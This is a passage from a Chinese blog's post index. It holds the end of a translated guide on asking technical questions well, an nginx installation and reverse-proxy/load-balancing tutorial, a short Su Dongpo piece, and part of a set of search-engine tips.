strong>喜欢</strong>我们现在这个样子，并且通常对病患标记都有站得住脚的怀疑）。</p><p>Jeff Bigler 的观察总结和这个相关也值得一读 (<strong><a href="http://www.mit.edu/~jcb/tact.html" target="_blank" rel="noopener">tact filters</a></strong>)。</p><p>在下一节，我们会谈到另一个问题，当<strong>你</strong>行为不当时所会受到的<code>冒犯</code>。</p><h2 id="如何避免扮演失败者"><a href="#如何避免扮演失败者" class="headerlink" title="如何避免扮演失败者"></a>如何避免扮演失败者</h2><p>在黑客社区的论坛中有那么几次你可能会搞砸 —— 以本指南所描述到的或类似的方式。而你会在公开场合中被告知你是如何搞砸的，也许攻击的言语中还会带点夹七夹八的颜色。</p><p>这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被口头攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、忘了关马桶盖等等。相反地，你该这么做：</p><p>熬过去，这很正常。事实上，它是有益健康且合理的。</p><p>社区的标准不会自行维持，它们是通过参与者积极而<strong>公开地</strong>执行来维持的。不要哭嚎所有的批评都应该通过私下的邮件传送，它不是这样运作的。当有人评论你的一个说法有误或者提出不同看法时，坚持声称受到个人攻击也毫无益处，这些都是失败者的态度。</p><p>也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称<code>如果你不想帮助用户就闭嘴。</code> 结果造成有想法的参与者纷纷离开，这么做只会使它们沦为毫无意义的唠叨与无用的技术论坛。</p><p>夸张的讲法是：你要的是“友善”（以上述方式）还是有用？两个里面挑一个。</p><p>记着：当黑客说你搞砸了，并且（无论多么刺耳）告诉你别再这样做时，他正在为关心<strong>你</strong>和<strong>他的社区</strong>而行动。对他而言，不理你并将你从他的生活中滤掉更简单。如果你无法做到感谢，至少要表现得有点尊严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人像对待脆弱的洋娃娃那样对你。</p><p>有时候，即使你没有搞砸（或者只是在他的想像中你搞砸了），有些人也会无缘无故地攻击你本人。在这种情况下，抱怨倒是<strong>真的</strong>会把问题搞砸。</p><p>这些来找麻烦的人要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理专家。其它读者要么不理睬，要么用自己的方式对付他们。这些来找麻烦的人在给他们自己找麻烦，这点你不用操心。</p><p>也别让自己卷入口水战，最好不要理睬大多数的口水战 —— 当然，这是在你检验它们只是口水战，并且未指出你有搞砸的地方，同时也没有巧妙地将问题真正的答案藏于其后（这也是有可能的）。</p><h2 id="不该问的问题"><a href="#不该问的问题" class="headerlink" title="不该问的问题"></a>不该问的问题</h2><p>以下是几个经典蠢问题，以及黑客没回答时心中所想的：</p><p>问题：<a href="#q1">我能在哪找到 X 程序或 X 资源？</a></p><p>问题：<a href="#q2">我怎样用 X 做 Y？</a></p><p>问题：<a href="#q3">如何设定我的 shell 提示？</a></p><p>问题：<a href="#q4">我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？</a></p><p>问题：<a href="#q5">我的程序/设定/SQL 语句没有用</a></p><p>问题：<a href="#q6">我的 Windows 电脑有问题，你能帮我吗？</a></p><p>问题：<a href="#q7">我的程序不会动了，我认为系统工具 X 有问题</a></p><p>问题：<a href="#q8">我在安装 Linux（或者 X ）时有问题，你能帮我吗？</a></p><p>问题：<a href="#q9">我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</a></p><hr><p><a id="q1"></a></p><blockquote><p>问题：我能在哪找到 X 程序或 X 资源？</p></blockquote><p>回答：就在我找到它的地方啊，白痴 —— 搜索引擎的那一头。天哪！难道还有人不会用 <a href="http://www.google.com" target="_blank" rel="noopener">Google</a> 吗？</p><p><a id="q2"></a></p><blockquote><p>问题：我怎样用 X 做 Y？</p></blockquote><p>回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。</p><p><a id="q3"></a></p><blockquote><p>问题：如何设定我的 shell 提示？？</p></blockquote><p>回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 <a href="#RTFM">RTFM</a>，然后自己去找出来。</p><p><a id="q4"></a></p><blockquote><p>问题：我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？</p></blockquote><p>回答：试试看就知道了。如果你试过，你既知道了答案，就不用浪费我的时间了。</p><p><a id="q5"></a></p><blockquote><p>问题：我的{程序/设定/SQL 语句}不工作</p></blockquote><p>回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 —— 我有更有意思的事要做呢。在看到这类问题的时候，我的反应通常不外如下三种</p><ul><li>你还有什么要补充的吗？</li><li>真糟糕，希望你能搞定。</li><li>这关我屁事？</li></ul><p><a id="q6"></a></p><blockquote><p>问题：我的 Windows 电脑有问题，你能帮我吗？</p></blockquote><p>回答：能啊，扔掉微软的垃圾，换个像 Linux 或 BSD 的开源操作系统吧。</p><p>注意：如果程序有官方版 Windows 或者与 Windows 有互动（如 Samba），你<strong>可以</strong>问与 Windows 相关的问题， 只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。</p><p><a id="q7"></a></p><blockquote><p>问题：我的程序不会动了，我认为系统工具 X 有问题</p></blockquote><p>回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库档案有明显缺陷的人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有清楚而详尽的缺陷说明文件作后盾。</p><p><a id="q8"></a></p><blockquote><p>问题：我在安装 Linux（或者 X ）时有问题，你能帮我吗？</p></blockquote><p>回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在<a href="http://www.linux.org/groups/index.html" target="_blank" rel="noopener">这儿</a>找到使用者群组的清单）。</p><p>注意：如果安装问题与某 Linux 的发行版有关，在它的邮件列表、论坛或本地使用者群组中提问也许是恰当的。此时，应描述问题的准确细节。在此之前，先用 <code>Linux</code> 和<strong>所有</strong>被怀疑的硬件作关键词仔细搜索。</p><p><a id="q9"></a></p><blockquote><p>问题：我怎么才能破解 root 帐号/窃取 OP 特权/读别人的邮件呢？</p></blockquote><p>回答：想要这样做，说明了你是个卑鄙小人；想找个黑客帮你，说明你是个白痴！</p><h2 id="好问题与蠢问题"><a href="#好问题与蠢问题" class="headerlink" title="好问题与蠢问题"></a>好问题与蠢问题</h2><p>最后，我将透过举一些例子，来说明怎样聪明的提问；同一个问题的两种问法被放在一起，一种是愚蠢的，另一种才是明智的。</p><p><strong>蠢问题</strong>：</p><blockquote><p>我可以在哪儿找到关于 Foonly Flurbamatic 的资料？</p></blockquote><p>这种问法无非想得到 <a href="#RTFM">STFW</a> 这样的回答。</p><p><strong>聪明问题</strong>：</p><blockquote><p>我用 Google 搜索过 “Foonly Flurbamatic 2600”，但是没找到有用的结果。谁知道上哪儿去找对这种设备编程的资料？</p></blockquote><p>这个问题已经 STFW 过了，看起来他真的遇到了麻烦。</p><p><strong>蠢问题</strong>：</p><blockquote><p>我从 foo 项目找来的源码没法编译。它怎么这么烂？</p></blockquote><p>他觉得都是别人的错，这个傲慢自大的提问者。</p><p><strong>聪明问题</strong>：</p><blockquote><p>foo 项目代码在 Nulix 6.2 版下无法编译通过。我读过了 FAQ，但里面没有提到跟 Nulix 有关的问题。这是我编译过程的记录，我有什么做的不对的地方吗？</p></blockquote><p>提问者已经指明了环境，也读过了 FAQ，还列出了错误，并且他没有把问题的责任推到别人头上，他的问题值得被关注。</p><p><strong>蠢问题</strong>：</p><blockquote><p>我的主机板有问题了，谁来帮我？</p></blockquote><p>某黑客对这类问题的回答通常是：<code>好的，还要帮你拍拍背和换尿布吗？</code>，然后按下删除键。</p><p><strong>聪明问题</strong>：</p><blockquote><p>我在 S2464 主机板上试过了 X 、 Y 和 Z ，但没什么作用，我又试了 A 、 B 和 C 。请注意当我尝试 C 时的奇怪现象。显然 florbish 正在 grommicking，但结果出人意料。通常在 Athlon MP 主机板上引起 grommicking 的原因是什么？有谁知道接下来我该做些什么测试才能找出问题？</p></blockquote><p>这个家伙，从另一个角度来看，值得去回答他。他表现出了解决问题的能力，而不是坐等天上掉答案。</p><p>在最后一个问题中，注意<code>告诉我答案</code>和<code>给我启示，指出我还应该做什么诊断工作</code>之间微妙而又重要的区别。</p><p>事实上，后一个问题源自于 2001 年 8 月在 Linux 内核邮件列表（lkml）上的一个真实的提问。我（Eric）就是那个提出问题的人。我在 Tyan S2464 主板上观察到了这种无法解释的锁定现象，列表成员们提供了解决这一问题的重要信息。</p><p>通过我的提问方法，我给了别人可以咀嚼玩味的东西；我设法让人们很容易参与并且被吸引进来。我显示了自己具备和他们同等的能力，并邀请他们与我共同探讨。通过告诉他们我所走过的弯路，以避免他们再浪费时间，我也表明了对他们宝贵时间的尊重。</p><p>事后，当我向每个人表示感谢，并且赞赏这次良好的讨论经历的时候， 一个 Linux 内核邮件列表的成员表示，他觉得我的问题得到解决并非由于我是这个列表中的<strong>名</strong>人，而是因为我用了正确的方式来提问。</p><p>黑客从某种角度来说是拥有丰富知识但缺乏人情味的家伙；我相信他是对的，如果我<strong>像</strong>个乞讨者那样提问，不论我是谁，一定会惹恼某些人或者被他们忽视。他建议我记下这件事，这直接导致了本指南的出现。</p><h2 id="如果得不到回答"><a href="#如果得不到回答" class="headerlink" title="如果得不到回答"></a>如果得不到回答</h2><p>如果仍得不到回答，请不要以为我们觉得无法帮助你。有时只是看到你问题的人不知道答案罢了。没有回应不代表你被忽视，虽然不可否认这种差别很难区分。</p><p>总的来说，简单的重复张贴问题是个很糟的点子。这将被视为无意义的喧闹。有点耐心，知道你问题答案的人可能生活在不同的时区，可能正在睡觉，也有可能你的问题一开始就没有组织好。</p><p>你可以通过其他渠道获得帮助，这些渠道通常更适合初学者的需要。</p><p>有许多网上的以及本地的使用者群组，由热情的软件爱好者（即使他们可能从没亲自写过任何软件）组成。通常人们组建这样的团体来互相帮助并帮助新手。</p><p>另外，你可以向很多商业公司寻求帮助，不论公司大还是小。别为要付费才能获得帮助而感到沮丧！毕竟，假使你的汽车发动机汽缸密封圈爆掉了 —— 完全可能如此 —— 你还得把它送到修车铺，并且为维修付费。就算软件没花费你一分钱，你也不能强求技术支持总是免费的。</p><p>对像是 Linux 这种大众化的软件，每个开发者至少会对应到上万名使用者。根本不可能由一个人来处理来自上万名使用者的求助电话。要知道，即使你要为这些协助付费，和你所购买的同类软件相比，你所付出的也是微不足道的（通常封闭源代码软件的技术支持费用比开源软件的要高得多，且内容也没那么丰富）。</p><h2 id="如何更好地回答问题"><a href="#如何更好地回答问题" class="headerlink" title="如何更好地回答问题"></a>如何更好地回答问题</h2><p><strong>态度和善一点</strong>。问题带来的压力常使人显得无礼或愚蠢，其实并不是这样。</p><p><strong>对初犯者私下回复</strong>。对那些坦诚犯错之人没有必要当众羞辱，一个真正的新手也许连怎么搜索或在哪找常见问题都不知道。</p><p><strong>如果你不确定，一定要说出来</strong>！一个听起来权威的错误回复比没有还要糟，别因为听起来像个专家很好玩，就给别人乱指路。要谦虚和诚实，给提问者与同行都树个好榜样。</p><p><strong>如果帮不了忙，也别妨碍他</strong>。不要在实际步骤上开玩笑，那样也许会毁了使用者的设置 —— 有些可怜的呆瓜会把它当成真的指令。</p><p><strong>试探性的反问以引出更多的细节</strong>。如果你做得好，提问者可以学到点东西 —— 你也可以。试试将蠢问题转变成好问题，别忘了我们都曾是新手。</p><p>尽管对那些懒虫抱怨一声 RTFM 是正当的，能指出文件的位置（即使只是建议个 Google 搜索关键词）会更好。</p><p><strong>如果你决定回答，就请给出好的答案</strong>。当别人正在用错误的工具或方法时别建议笨拙的权宜之计（workaround），应推荐更好的工具，重新界定问题。</p><p><strong>正面的回答问题</strong>！如果这个提问者已经很深入的研究而且也表明已经试过 X 、 Y 、 Z 、 A 、 B 、 C 但没得到结果，回答 <code>试试看 A 或是 B</code> 或者 <code>试试 X 、 Y 、 Z 、 A 、 B 、 C</code> 并附上一个链接一点用都没有。</p><p><strong>帮助你的社区从问题中学习</strong>。当回复一个好问题时，问问自己<code>如何修改相关文件或常见问题文件以免再次解答同样的问题？</code>，接着再向文件维护者发一份补丁。</p><p>如果你是在研究一番后才做出的回答，<strong>展现你的技巧而不是直接端出结果</strong>。毕竟<code>授人以鱼不如授人以渔</code>。</p><h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>如果你需要个人电脑、Unix 系统和网络如何运作的基础知识，参阅 <a href="http://en.tldp.org/HOWTO/Unix-and-Internet-Fundamentals-HOWTO/" target="_blank" rel="noopener">Unix 系统和网络基本原理</a>。</p><p>当你发布软件或补丁时，试着按<a href="http://en.tldp.org/HOWTO/Software-Release-Practice-HOWTO/index.html" target="_blank" rel="noopener">软件发布实践</a>操作。</p><h2 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h2><p>Evelyn Mitchel 贡献了一些愚蠢问题例子并启发了编写<code>如何更好地回答问题</code>这一节， Mikhail Ramendik 贡献了一些特别有价值的建议和改进。</p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx的使用</title>
      <link href="2020/07/12/nginx-de-shi-yong/"/>
      <url>2020/07/12/nginx-de-shi-yong/</url>
      
        <content type="html"><![CDATA[<p><img src="http://nginx.org/nginx.png" alt></p><h3 id="1-Nginx是什么？"><a href="#1-Nginx是什么？" class="headerlink" title="1.Nginx是什么？"></a>1.Nginx是什么？</h3><p>1.1 nginx是一款高性能的http服务器/反向代理服务器一家电子邮件的（IMAP/POP3）代理服务器。有实验表明Nginx能够支持5W条链接的并发，并且对CPU,内存等资源消耗非常低，运行非常稳定，基本不用重启。</p><h3 id="2-Nginx的下载"><a href="#2-Nginx的下载" class="headerlink" title="2.Nginx的下载"></a>2.Nginx的下载</h3><p>进入<a href="http://nginx.org/en/download.html" target="_blank" rel="noopener">http://nginx.org/en/download.html</a> 下载nginx<br><img src="https://s1.ax1x.com/2020/06/13/tvywCj.png" alt="img"></p><h3 id="3-Nginx安装"><a href="#3-Nginx安装" class="headerlink" title="3.Nginx安装"></a>3.Nginx安装</h3><h5 id="3-1-nginx安装环境"><a href="#3-1-nginx安装环境" class="headerlink" title="3.1 nginx安装环境"></a>3.1 nginx安装环境</h5><p>nginx是C语言开发，建议在linux上运行.</p><p><strong>gcc</strong></p><p>安装nginx需要先将官网下载的源码进行编译，编译依赖gcc环境，如果没有gcc环境，需要安装gcc：<code>yum –y install gcc-c++</code></p><p><strong>PCRE</strong></p><p>PCRE(Perl Compatible Regular Expressions)是一个Perl库，包括 perl 兼容的正则表达式库。nginx的http模块使用pcre来解析正则表达式，所以需要在linux上安装pcre库。</p><p><code>yum install -y pcre pcre-devel</code></p><p>注：pcre-devel是使用pcre开发的一个二次开发库。nginx也需要此库。</p><p><strong>zlib</strong></p><p>zlib库提供了很多种压缩和解压缩的方式，nginx使用zlib对http包的内容进行gzip，所以需要在linux上安装zlib库。</p><p><code>yum install -y zlib zlib-devel</code></p><p><strong>openssl</strong></p><p>OpenSSL 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。</p><p>nginx不仅支持http协议，还支持https（即在ssl协议上传输http），所以需要在linux安装openssl库。</p><p><code>yum install -y openssl openssl-devel</code></p><h5 id="3-2-编译安装"><a href="#3-2-编译安装" class="headerlink" title="3.2 编译安装"></a>3.2 编译安装</h5><p>将nginx-1.8.0.tar.gz拷贝至linux服务器。</p><p>解压：</p><p><code>tar -zxvf nginx-1.8.0.tar.gz</code></p><p><code>cd nginx-1.8.0</code></p><p> 1、 configure</p><p>./configure –help查询详细参数（参考本教程附录部分：nginx编译参数）</p><p>参数设置如下：</p><pre><code>    ./configure \    --prefix=/usr/local/nginx \    --pid-path=/var/run/nginx/nginx.pid \    --lock-path=/var/lock/nginx.lock \    --error-log-path=/var/log/nginx/error.log \    --http-log-path=/var/log/nginx/access.log \    --with-http_gzip_static_module \    --http-client-body-temp-path=/var/temp/nginx/client \    --http-proxy-temp-path=/var/temp/nginx/proxy \    --http-fastcgi-temp-path=/var/temp/nginx/fastcgi \    --http-uwsgi-temp-path=/var/temp/nginx/uwsgi \    --http-scgi-temp-path=/var/temp/nginx/scgi</code></pre><p>注意：上边将临时文件目录指定为/var/temp/nginx，需要在/var下创建temp及nginx目录</p><p><code>mkdir -p /var/temp/nginx</code></p><p>2、 编译安装</p><p>make</p><p><code>make  install</code></p><p>安装成功查看安装目录</p><h5 id="3-3-启动nginx"><a href="#3-3-启动nginx" class="headerlink" title="3.3 启动nginx"></a>3.3 启动nginx</h5><p>cd /usr/local/nginx/sbin/</p><p>./nginx </p><p>查询nginx进程：</p><p>15098是nginx主进程的进程id，15099是nginx工作进程的进程id</p><p>注意：</p><p>执行./nginx启动nginx，这里可以-c指定加载的nginx配置文件，如下：</p><p>./nginx -c /usr/local/nginx/conf/nginx.conf</p><p>如果不指定-c，nginx在启动时默认加载conf/nginx.conf文件，此文件的地址也可以在编译安装nginx时指定./configure的参数（–conf-path= 指向配置文件（nginx.conf））</p><h5 id="3-4-停止nginx"><a href="#3-4-停止nginx" class="headerlink" title="3.4 停止nginx"></a>3.4 停止nginx</h5><p>方式1，快速停止：</p><p><code>cd /usr/local/nginx/sbin</code></p><p><code>./nginx -s stop</code></p><p>此方式相当于先查出nginx进程id再使用kill命令强制杀掉进程。</p><p>方式2，完整停止(建议使用)：</p><p><code>cd /usr/local/nginx/sbin</code></p><p><code>./nginx -s quit</code></p><p>此方式停止步骤是待nginx进程处理任务完毕进行停止。</p><h5 id="3-5-重启nginx"><a href="#3-5-重启nginx" class="headerlink" title="3.5 重启nginx"></a>3.5 重启nginx</h5><p>方式1，先停止再启动（建议使用）：</p><p>对nginx进行重启相当于先停止nginx再启动nginx，即先执行停止命令再执行启动命令。</p><p>如下：</p><p><code>./nginx -s quit</code></p><p><code>./nginx</code></p><p>方式2，重新加载配置文件：</p><p>当nginx的配置文件nginx.conf修改后，要想让配置生效需要重启nginx，使用-s reload不用先停止nginx再启动nginx即可将配置信息在nginx中生效，如下：</p><p><code>./nginx -s reload</code></p><h3 id="4-反向代理服务器"><a href="#4-反向代理服务器" class="headerlink" title="4.反向代理服务器"></a>4.反向代理服务器</h3><h5 id="4-1什么是反向代理"><a href="#4-1什么是反向代理" class="headerlink" title="4.1什么是反向代理"></a>4.1什么是反向代理</h5><p>通常的代理服务器，只用于代理内部网络对Internet的连接请求，客户机必须指定代理服务器,并将本来要直接发送到Web服务器上的http请求发送到代理服务器中由代理服务器向Internet上的web服务器发起请求，最终达到客户机上网的目的。</p><p>而反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个反向代理服务器。</p><p>如下图：<img src="https://s1.ax1x.com/2020/06/13/tvhSfO.jpg" alt></p><h5 id="4-2-nginx-tomcat反向代理"><a href="#4-2-nginx-tomcat反向代理" class="headerlink" title="4.2 nginx+tomcat反向代理"></a>4.2 nginx+tomcat反向代理</h5><p>两个tomcat服务通过nginx反向代理，本例子使用三台虚拟机进行测试，</p><p>nginx服务器：192.168.101.3</p><p>tomcat1服务器：192.168.101.5</p><p>tomcat2服务器：192.168.101.6</p><p>如下图：<br><img src="https://s1.ax1x.com/2020/06/13/tvh9pD.png" alt></p><h5 id="4-3-启动tomcat"><a href="#4-3-启动tomcat" class="headerlink" title="4.3 启动tomcat"></a>4.3 启动tomcat</h5><p>tomcat使用apache-tomcat-7.0.57版本，在192.168.101.5和192.168.101.6虚拟机上启动tomcat。</p><h5 id="4-4-nginx反向代理配置"><a href="#4-4-nginx反向代理配置" class="headerlink" title="4.4 nginx反向代理配置"></a>4.4 nginx反向代理配置</h5><p>根据上边的需求在nginx.conf文件中配置反向代理，如下：</p><p>配置一个代理即tomcat1服务器</p><p>upstream tomcat_server1 {</p><pre><code>        server 192.168.101.5:8080;    }</code></pre><p>配置一个代理即tomcat2服务器</p><pre><code>upstream tomcat_server2 {        server 192.168.101.6:8080;    }</code></pre><p>配置一个虚拟主机</p><pre><code>server {    listen 80;    server_name aaa.test.com;    location / {</code></pre><p>域名aaa.test.com的请求全部转发到tomcat_server1即tomcat1服务上</p><pre><code>            proxy_pass http://tomcat_server1;</code></pre><p>欢迎页面，按照从左到右的顺序查找页面</p><pre><code>            index index.jsp index.html index.htm;    }}server {    listen 80;    server_name bbb.test.com;    location / {</code></pre><p> 域名bbb.test.com的请求全部转发到tomcat_server2即tomcat2服务上</p><pre><code>              proxy_pass http://tomcat_server2;              index index.jsp index.html index.htm;    }}</code></pre><p> 6.2.4 测试<br>分别修改两个tomcat下的webapps/ROOT/index.jsp的内容，使用tomcat1和tomcat2两个服务首页显示不同的内容，如下：</p><p>tomcat1下的index.jsp修改后：</p><p><img src="https://s1.ax1x.com/2020/06/13/tv4iCT.png" alt></p><p>tomcat2下的index.jsp修改后：<br><img src="https://s1.ax1x.com/2020/06/13/tv4F8U.png" alt></p><p>分别访问aaa.test.com、bbb.test.com测试反向代理。</p><p>请求访问aaa.test.com通过nginx代理访问tomcat1，请求访问bbb.test.com通过nginx代理访问tomcat2。</p><h3 id="5-负载均衡"><a href="#5-负载均衡" class="headerlink" title="5 负载均衡"></a>5 负载均衡</h3><h5 id="5-1-什么是负载均衡"><a href="#5-1-什么是负载均衡" class="headerlink" title="5.1 什么是负载均衡"></a>5.1 什么是负载均衡</h5><p>负载均衡 建立在现有网络结构之上，它提供了一种廉价有效透明的方法扩展网络设备和服务器的带宽、增加吞吐量、加强网络数据处理能力、提高网络的灵活性和可用性。</p><p>负载均衡，英文名称为Load Balance，其意思就是分摊到多个操作单元上进行执行，例如Web服务器、FTP服务器、企业关键应用服务器和其它关键任务服务器等，从而共同完成工作任务。</p><h5 id="5-2-nginx实现负载均衡"><a href="#5-2-nginx实现负载均衡" class="headerlink" title="5.2 nginx实现负载均衡"></a>5.2 nginx实现负载均衡</h5><p>nginx作为负载均衡服务器，用户请求先到达nginx，再由nginx根据负载配置将请求转发至 tomcat服务器。</p><p>nginx负载均衡服务器：192.168.101.3</p><p>tomcat1服务器：192.168.101.5</p><p>tomcat2服务器：192.168.101.6<br><img src="https://s1.ax1x.com/2020/06/13/tv4C5V.png" alt></p><h5 id="5-3-配置"><a href="#5-3-配置" class="headerlink" title="5.3 配置"></a>5.3 配置</h5><p>根据上边的需求在nginx.conf文件中配置负载均衡，如下：</p><p>upstream tomcat_server_pool{</p><pre><code>    server 192.168.101.5:8080 weight=10;    server 192.168.101.6:8080 weight=10;    }server {    listen 80;    server_name aaa.test.com;    location / {             proxy_pass http://tomcat_server_pool;             index index.jsp index.html index.htm;    }}</code></pre><h5 id="5-4-测试"><a href="#5-4-测试" class="headerlink" title="5.4 测试"></a>5.4 测试</h5><p>请求aaa.test.com，通过nginx负载均衡，将请求转发到tomcat服务器。</p><p>通过观察tomcat的访问日志或tomcat访问页面即可知道当前请求由哪个tomcat服务器受理。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>苏东坡-人生赏心十六件乐事</title>
      <link href="2020/06/30/su-dong-po-ren-sheng-shang-xin-shi-liu-jian-le-shi/"/>
      <url>2020/06/30/su-dong-po-ren-sheng-shang-xin-shi-liu-jian-le-shi/</url>
      
        <content type="html"><![CDATA[<p>清溪浅水行舟；</p><p>微雨竹窗夜话；</p><p>暑至临溪濯足；</p><p>雨后登楼看山；</p><p>柳荫堤畔闲行；</p><p>花坞樽前微笑；</p><p>隔江山寺闻钟；</p><p>月下东邻吹箫；</p><p>晨兴半柱茗香；</p><p>午倦一方藤枕；</p><p>开瓮勿逢陶谢；</p><p>接客不着衣冠；</p><p>乞得名花盛开；</p><p>飞来家禽自语；</p><p>客至汲泉烹茶；</p><p>抚琴听者知音。</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210630152112570.png" alt="image-20210630152112570"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何正确的使用百度精准搜索</title>
      <link href="2020/06/30/ru-he-zheng-que-de-shi-yong-bai-du-jing-zhun-sou-suo/"/>
      <url>2020/06/30/ru-he-zheng-que-de-shi-yong-bai-du-jing-zhun-sou-suo/</url>
      
        <content type="html"><![CDATA[<h1 id="如何正确的使用百度精准搜索"><a href="#如何正确的使用百度精准搜索" class="headerlink" title="如何正确的使用百度精准搜索"></a>如何正确的使用百度精准搜索</h1><h4 id="1-去除广告推荐"><a href="#1-去除广告推荐" class="headerlink" title="1. 去除广告推荐"></a>1. 去除广告推荐</h4><p>推荐使用工具:<code>Adblock Plus</code>  和  <code>AdGuard</code></p><p>也可以使用<code>Stylish</code>的拓展, 搜索<code>Baidu Lite</code>的皮肤</p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210626140821228.png" alt="image-20210626140821228"><h4 id="2-精确搜索：双引号"><a href="#2-精确搜索：双引号" class="headerlink" title="2.精确搜索：双引号"></a>2.精确搜索：双引号</h4><p>精确搜索，就是在你要搜索的词上，加上双引号，那个 Google 搜索引擎，就会完全的匹配你所要的词</p><p>比如搜索：”前端GitHub”</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210626141154941.png" alt="image-20210626141154941"></p><h4 id="3-站内搜索：site"><a href="#3-站内搜索：site" class="headerlink" title="3.站内搜索：site"></a>3.站内搜索：site</h4><p>这是一个比较常用的搜索方法，<code>site 搜索</code>，就是在站内进行搜索.</p><p>语法是：<code>site:stackoverflow.com</code> ，其中 <code>site:后面加上你要搜索的网站地址</code>。</p><p>一般程序猿解决问题，用 <code>site:stackoverflow.com</code>，大部分解决不了的问题，都会有答案了。</p><p>比如在 segmentfault.com 里面搜索：”react打包npm run build生成的文件好大，怎样关掉生成 sourceMap” site:segmentfault.com</p><p><img src="https://raw.githubusercontent.com/leblog/img/main/huiyi/image-20210626141348952.png" alt="image-20210626141348952"></p><p>除了以上内容之外，还可以在 <code>工具</code> 那里进行筛选，有语言、时间、结果 3 种选项。</p><p><img src="https://segmentfault.com/img/remote/1460000038432194" alt="img"></p><p>如果想通过时间筛选出最近的的内容，就可以试试时间的筛选了</p><p><img src="https://segmentfault.com/img/remote/1460000038432204" alt="img"></p><p>还可以对结果进行 精确匹配 的筛选</p><p><img src="https://segmentfault.com/img/remote/1460000038432197" alt="img"></p><h4 id="4-配符搜索："><a href="#4-配符搜索：" class="headerlink" title="4.配符搜索：*"></a>4.配符搜索：*</h4><p>这也是一个比较常用的搜索方法，通常通配符搜索，用在模糊印象的地方比较多。</p><p>当我想搜一句歌词，“让我们同步进阶 重生的力量来自真我 战胜可敬的对手 yeah” ，但是前边的 “让我们同步进阶”，就可以用这个方法进行搜索了。搜索 *重生的力量来自真我</p><p>就会得到我们想要的结果了：林俊杰唱的《进阶》。</p><p><img src="https://segmentfault.com/img/remote/1460000038432199" alt="img"></p><h4 id="5-减号排除，缩小范围："><a href="#5-减号排除，缩小范围：" class="headerlink" title="5.减号排除，缩小范围：-"></a>5.减号排除，缩小范围：-</h4><p>当搜索量比较大的时候，使用减号 <code>-</code> 通过减号，能够去掉一些无关的搜索。</p><p>比如：全栈修炼 -全栈修炼之路</p><p><img src="https://segmentfault.com/img/remote/1460000038432196" alt="img"></p><h4 id="6-文档搜索：filetype"><a href="#6-文档搜索：filetype" class="headerlink" title="6.文档搜索：filetype"></a>6.文档搜索：filetype</h4><p>文档搜索命令 <code>filetype</code>，多数情况下用以查找我们所需要的资料，返回的页面是你搜索的文档相应格式。</p><p>如搜 JavaScript权威指南（第四版）的 pdf，就是: filetype:pdf JavaScript权威指南（第四版）</p><p><img src="https://segmentfault.com/img/remote/1460000038432195" alt="img"></p><h4 id="7-图片搜索"><a href="#7-图片搜索" class="headerlink" title="7.图片搜索"></a>7.图片搜索</h4><p>平常在网上考到一张好的图片，可以保持下来，但是由于图片的尺寸过小，或者像素不合适，这个时候，只要用谷歌图片搜索，就能找到许多类似的，或者尺寸清晰度更好的同一张。</p><p><img src="https://segmentfault.com/img/remote/1460000038432205" alt="img"></p><p><img src="https://segmentfault.com/img/remote/1460000038432201" alt="img"></p><p>比如我上传了一张 node 的 logo 的图片时，结果如下：</p><p><img src="https://segmentfault.com/img/remote/1460000038432203" alt="img"></p><h4 id="8-intitle-搜索范围限定在网页标题"><a href="#8-intitle-搜索范围限定在网页标题" class="headerlink" title="8.intitle - 搜索范围限定在网页标题"></a>8.intitle - 搜索范围限定在网页标题</h4><p>搜索范围限定在包含 <code>keyword</code> 的网页标题中，这也是最普通的搜索。</p><p><code>intitle</code>: 和后面的关键词之间不要有空格。</p><p>例如：</p><pre><code>intitle:前端开发</code></pre><p><img src="https://segmentfault.com/img/remote/1460000038432207" alt="img"></p><p>对比普通搜索的图，发现搜索到的内容有一点点不一样，但并无太大差别。</p><h4 id="9-inurl-搜索范围限定在-url-链接中"><a href="#9-inurl-搜索范围限定在-url-链接中" class="headerlink" title="9.inurl 搜索范围限定在 url 链接中"></a>9.inurl 搜索范围限定在 url 链接中</h4><p><strong>搜索范围限定在 <code>url</code> 